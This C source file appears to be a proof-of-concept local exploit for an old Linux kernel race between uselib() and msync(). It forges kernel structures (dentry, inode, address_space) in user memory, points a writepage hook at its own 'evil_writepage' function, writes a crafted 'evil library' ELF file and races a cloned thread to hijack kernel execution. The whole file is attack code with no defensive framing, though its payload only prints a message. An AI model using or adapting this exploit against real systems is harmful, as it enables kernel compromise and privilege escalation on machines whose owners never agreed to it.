#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
 
#include <sched.h>
#include <signal.h>
#include <stdio.h>
 
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/fcntl.h>
#include <sys/mman.h>
#include <linux/elf.h>

#include <asm/atomic.h>

#define BASE (char *) 0x60000000
#define EATFILE "TTeatfile"
#define LIBFILE "TTlib"

#define PAGE_UP(x) ((x+PAGE_SIZE-1) & ~(PAGE_SIZE-1))
#define PG_dirty 4
#define INIT_LIST_HEAD(ptr) do { \
	(ptr)->next = (ptr); (ptr)->prev = (ptr); \
} while (0)

static char thread_stack[16384];
char *swapmem = NULL;
char *base = BASE;
int t2;
int fd3;
volatile int race_start = 0;

struct list_head {
  	struct list_head      *next;
  	struct list_head      *prev;
};

struct spinlock_t {
};

struct wq_lock_t {
};

struct wait_queue_head_t {
	struct wq_lock_t lock;
	struct list_head task_list;
};

struct page {
	struct list_head list;		
	struct address_space *mapping;	
	unsigned long index;		
	struct page *next_hash;		
	atomic_t count;			
	unsigned long flags;		
};

struct address_space_operations {
	int (*writepage)(struct page *);
};

struct address_space {
	struct list_head	clean_pages;	
	struct list_head	dirty_pages;	
	struct list_head	locked_pages;	
	unsigned long		nrpages;	
	struct address_space_operations *a_ops;	
};

struct semaphore {
	atomic_t count;
	int sleepers;
	struct wait_queue_head_t wait;
};

struct rw_semaphore {
	signed int		activity;
	struct spinlock_t	wait_lock;
	struct list_head	wait_list;
};

struct inode {
  	struct list_head      i_hash;
  	struct list_head	i_list;
  	struct list_head	i_dentry;

  	struct list_head	i_dirty_buffers;
  	struct list_head	i_dirty_data_buffers;
	
  	unsigned long		i_ino;
  	atomic_t		i_count;
  	unsigned short	i_dev;
  	unsigned short	i_mode;
  	unsigned short	i_nlink;
  	unsigned int	i_uid;
  	unsigned int	i_gid;
  	unsigned short	i_rdev;
  	long long		i_size;
  	long			i_atime;
  	long			i_mtime;
  	long			i_ctime;
  	unsigned int		i_blkbits;
  	unsigned long		i_blksize;
  	unsigned long		i_blocks;
  	unsigned long		i_version;
  	unsigned short        i_bytes;
  	struct semaphore	i_sem;
  	struct rw_semaphore	i_alloc_sem;
  	struct semaphore	i_zombie;
  	void	*i_op;
  	void	*i_fop;
  	void	*i_sb;
  	struct wait_queue_head_t	i_wait;
  	void	*i_flock;
  	struct address_space	*i_mapping;
};

struct dentry {
  	atomic_t d_count;
  	unsigned int d_flags;
  	struct inode *d_inode;
};

struct libimg {
  	Elf32_Ehdr elf;
  	Elf32_Phdr ph;
};

/* the image of the evil library. */
struct libimg limg = {
  	{
  	e_ident: "\177ELF",
  	e_type: ET_EXEC,
  	e_machine: EM_386,
  	e_phoff: sizeof(Elf32_Ehdr),
  	e_ehsize: sizeof(Elf32_Ehdr),
  	e_phentsize: sizeof(Elf32_Phdr),
  	e_phnum: 1
  	},
  	{
  	p_type: PT_LOAD,
  	p_vaddr: 0,
  	p_memsz: 0
  	}
};

int evil_writepage(struct page *p)
{
  	printf("You've done bad things!!\n");
  	//exit(1);
}

static void __list_add(struct list_head *new,
			      struct list_head *prev,
			      struct list_head *next)
{
	next->prev = new;
	next->next = next;
	new->prev = prev;
	prev->next = new;
}

static void list_add(struct list_head *new, struct list_head *head)
{
	__list_add(new, head, head->next);
}

/* build the fake f_dentry
 * we've to emulate a lot of things!
 */
struct fakes {
	struct dentry fake_dentry;
	struct inode fake_inode;
	unsigned long inode1[128];
  	struct page dirty_page;
  	struct address_space fake_mapping;
  	struct address_space_operations fake_ops;
};

struct fakes *fakes;

void buildfakes()
{
	fakes = mmap(0, PAGE_UP(sizeof(*fakes)), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  	memset(fakes, 0, PAGE_UP(sizeof(*fakes)));
	
    /* this will be i_sem */
	int i;
	for(i = 0; i < 32; i++)
		fakes->inode1[i] = 1;
	memcpy(&fakes->fake_inode, &fakes->inode1[0], 32 * sizeof(fakes->inode1[0]));

  	fakes->fake_dentry.d_inode  = &fakes->fake_inode; 
	fakes->fake_inode.i_mapping = &fakes->fake_mapping;
	
  	fakes->fake_mapping.a_ops   = &fakes->fake_ops;
  	fakes->fake_ops.writepage   = &evil_writepage;

    /* make page dirty */
	fakes->dirty_page.flags |= (1 << PG_dirty);
	INIT_LIST_HEAD(&fakes->fake_mapping.locked_pages);
	INIT_LIST_HEAD(&fakes->fake_mapping.dirty_pages);
  	list_add(&fakes->dirty_page.list, &fakes->fake_mapping.dirty_pages);
}

static void make_lib(char *name)
{
  	int libfd = open(name, O_CREAT|O_RDWR|O_TRUNC, 0700);
  	write(libfd, &limg, sizeof(limg));
  	fchmod(libfd, 0700);
}

static int thread(void *d)
{
	while(!race_start);
	if( msync(swapmem, PAGE_SIZE, MS_SYNC) < 0)
  	{
		perror("msync failed with error:");
	}
  	_exit(0);
return 0;
}
 
int main(int argc, char *argv[])
{
	buildfakes();

	fd3 = open(EATFILE, O_CREAT|O_RDWR|O_TRUNC, 0777);
	ftruncate(fd3, 16384);
	swapmem = base;
	mmap(swapmem, PAGE_SIZE, PROT_READ|PROT_WRITE,MAP_SHARED|MAP_FIXED, fd3, 0);
	close(fd3); //!!!

	t2 = clone(thread, thread_stack + sizeof(thread_stack) - 4, 0xf00, NULL);
	
	race_start = 1;

  	limg.ph.p_vaddr = (unsigned) swapmem;
  	limg.ph.p_memsz = PAGE_SIZE ;  make_lib(LIBFILE);

  	uselib(LIBFILE);

	return 0;
}
